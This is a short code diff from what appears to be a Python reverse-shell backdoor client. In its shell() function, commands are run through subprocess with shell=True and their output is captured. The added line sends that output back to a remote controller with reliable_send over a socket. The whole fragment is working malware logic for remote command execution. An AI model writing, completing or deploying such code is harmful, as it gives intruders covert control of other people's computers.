@@ -35,6 +35,7 @@ def shell():
                   execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                   result=execute.stdout.read() + execute.stderr.read()
                   result = result.decode()
+                  reliable_send(result)
 
 
 s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
